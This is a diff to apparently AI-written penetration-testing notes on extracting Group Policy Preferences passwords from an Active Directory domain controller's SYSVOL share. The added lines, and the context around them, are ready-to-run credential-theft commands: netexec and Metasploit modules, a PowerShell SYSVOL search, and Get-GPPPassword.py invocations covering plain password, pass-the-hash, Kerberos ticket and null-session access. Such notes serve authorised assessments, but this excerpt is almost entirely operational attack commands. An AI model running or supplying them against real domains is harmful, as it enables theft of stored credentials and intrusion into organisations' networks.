@@ -43,6 +43,15 @@ netexec smb <dc-ip> -u user -p Password -M gpp_autologin
 use post/windows/gather/credentials/gpp
 ```
 
+```bash
+# Get-GPPPassword.py (Impacket-based, ShutdownRepo) — one-shot remote find + decrypt
+# from Linux. Stream-carves SYSVOL over SMB (no mount) and decrypts inline.
+python3 Get-GPPPassword.py domain.local/user:Password@dc01.domain.local
+python3 Get-GPPPassword.py -hashes :NTHASH domain.local/user@dc01.domain.local   # Pass-the-Hash
+python3 Get-GPPPassword.py -k -no-pass domain.local/user@dc01.domain.local        # Kerberos ccache
+python3 Get-GPPPassword.py -no-pass domain.local/@dc01.domain.local               # NULL session
+```
+
 ```powershell
 # From Windows — search SYSVOL directly
 Get-ChildItem -Path "\\$env:USERDNSDOMAIN\SYSVOL" -Recurse -Include "*.xml" -ErrorAction SilentlyContinue |
@@ -146,4 +155,4 @@ nxc smb <subnet>/24 -u <service-acct> -p '<password>' -d DOMAIN
 
 *Created: 2026-03-06*
 *Updated: 2026-08-27*
-*Model: claude-opus-5*
+*Model: claude-opus-4-8*
